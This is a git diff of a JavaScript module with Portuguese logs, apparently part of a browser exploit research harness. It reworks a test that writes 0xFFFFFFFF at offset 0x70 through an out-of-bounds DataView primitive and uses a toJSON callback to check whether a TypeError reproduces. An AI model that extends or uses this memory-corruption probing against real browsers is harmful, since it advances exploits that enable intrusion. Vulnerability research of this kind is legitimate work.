@@ -8,32 +8,32 @@ import { toHex } from '../utils.mjs';
 // Contador global LOCALIZADO NESTE MÓDULO
 let current_toJSON_call_count_for_TypeError_test = 0;
 
-// Variante V2 (Controle que ANTES FALHAVA, agora para re-teste): Apenas incrementa o contador global.
-function toJSON_Decomp_V2_GlobalCounterOnly_ReTest() {
-    current_toJSON_call_count_for_TypeError_test++; 
-    // document.title = `toJSON_V2_ReTest Call ${current_toJSON_call_count_for_TypeError_test}`; // Mantenha comentado para isolar o contador
-    return { payloadV2_ReTest: "V2_retest_global_counter_incremented", call_count_inside_toJSON: current_toJSON_call_count_for_TypeError_test };
+// Variante que consistentemente causava TypeError nos logs anteriores
+function toJSON_Decomp_V2_GlobalCounterOnly() {
+    current_toJSON_call_count_for_TypeError_test++; // Operação que visamos testar
+    // document.title = `toJSON_Decomp_V2_GlobalCounterOnly Call: ${current_toJSON_call_count_for_TypeError_test}`; // Opcional para depuração
+    return { 
+        payloadV2: "V2_global_counter_incremented", 
+        call_count_inside_toJSON: current_toJSON_call_count_for_TypeError_test 
+    };
 }
 
+async function runTypeErrorReproductionTest() {
+    const FNAME_RUNNER = "runTypeErrorReproductionTest";
+    logS3(`==== INICIANDO Teste de Reprodução do TypeError (0xFFFFFFFF @ 0x70) ====`, 'test', FNAME_RUNNER);
 
-async function runTypeErrorReConfirmationTest() {
-    const FNAME_RUNNER = "runTypeErrorReConfirmationTest";
-    logS3(`==== INICIANDO Re-Teste do Gatilho do TypeError (GlobalCounterOnly) ====`, 'test', FNAME_RUNNER);
-
-    const testDescription = "ReTest_Decomp_V2_GlobalCounterOnly";
-    const toJSON_function_to_use = toJSON_Decomp_V2_GlobalCounterOnly_ReTest;
-    
+    const testDescription = "ReproduceTypeError_0xFFFFFFFF_at_0x70_CounterInc";
     const valueForCorruption = 0xFFFFFFFF;
     const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 
-    logS3(`\n--- Testando Variante toJSON: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
-    document.title = `Iniciando Re-Teste: ${testDescription}`; 
+    logS3(`\n--- Testando Variante toJSON: ${toJSON_Decomp_V2_GlobalCounterOnly.name} ---`, 'subtest', FNAME_RUNNER);
+    document.title = `Iniciando Teste: ${testDescription}`; 
     
     current_toJSON_call_count_for_TypeError_test = 0; // Resetar contador ANTES do teste
     
     const result = await executeFocusedTestForTypeError(
         testDescription,
-        toJSON_function_to_use,
+        toJSON_Decomp_V2_GlobalCounterOnly,
         valueForCorruption,
         criticalOffset
     );
@@ -51,37 +51,37 @@ async function runTypeErrorReConfirmationTest() {
     logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    if (result.errorOccurred?.name === 'TypeError') {
-        logS3(`   CONFIRMADO: TypeError ocorreu como nas observações anteriores (antes da refatoração do contador).`, "vuln", FNAME_RUNNER);
+    if (result.errorOccurred && result.errorOccurred.name === 'TypeError') {
+        logS3(`   CONFIRMADO: O TypeError ocorreu como nos testes anteriores.`, "vuln", FNAME_RUNNER);
     } else if (!result.errorOccurred && !result.potentiallyCrashed) {
-        logS3(`   NOTA: TypeError NÃO ocorreu. O comportamento mudou consistentemente após a refatoração do contador.`, "good", FNAME_RUNNER);
+        logS3(`   AVISO: O TypeError NÃO ocorreu. O comportamento mudou.`, "warn", FNAME_RUNNER);
     }
 
-    logS3(`==== Re-Teste do Gatilho do TypeError CONCLUÍDO ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Teste de Reprodução do TypeError CONCLUÍDO ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_ReConfirmTypeError';
+    const FNAME = 'runAllAdvancedTestsS3_ReproduceTypeError';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Re-Teste do Gatilho do TypeError (GlobalCounterOnly) ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Re-Teste TypeError";
+    logS3(`==== INICIANDO Script 3: Teste de Reprodução do TypeError (0xFFFFFFFF @ 0x70) ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - Reproduzir TypeError";
     
-    await runTypeErrorReConfirmationTest();
+    await runTypeErrorReproductionTest();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Re-Teste do TypeError) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Teste de Reprodução do TypeError) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
     
     if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
         // Manter
-    } else if (document.title.includes("ERRO")) {
+    } else if (document.title.includes("ERRO") || document.title.includes("TypeError")) {
         // Manter título de erro
     }
     else {
-        document.title = "Script 3 Concluído - Re-Teste TypeError";
+        document.title = "Script 3 Concluído - Reproduzir TypeError";
     }
 }
